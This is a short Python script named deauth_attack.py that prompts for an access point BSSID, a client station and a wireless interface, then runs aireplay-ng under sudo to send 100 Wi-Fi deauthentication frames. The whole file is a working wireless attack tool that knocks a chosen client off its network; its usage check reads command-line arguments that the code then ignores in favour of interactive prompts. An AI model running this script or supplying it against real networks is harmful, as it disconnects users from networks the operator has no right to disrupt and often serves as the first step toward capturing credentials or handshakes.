import sys
import subprocess

def run_deauth_attack(bssid, interface, station):
    # for client in clients:
    aireplay_cmd = ["sudo", "aireplay-ng", "--deauth", "100", "-a", bssid, "-c", station, interface]
    subprocess.run(aireplay_cmd)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 deauth_attack.py <BSSID> <INTERFACE> <CLIENT1> [<CLIENT2> ...]")
        sys.exit(1)

    # bssid = sys.argv[1]
    # interface = sys.argv[2]
    # clients = sys.argv[3:]
    bssid = input("bssid: ")
    station = input("station: ")
    interface = input("interface: ")

    run_deauth_attack(bssid, interface, station)
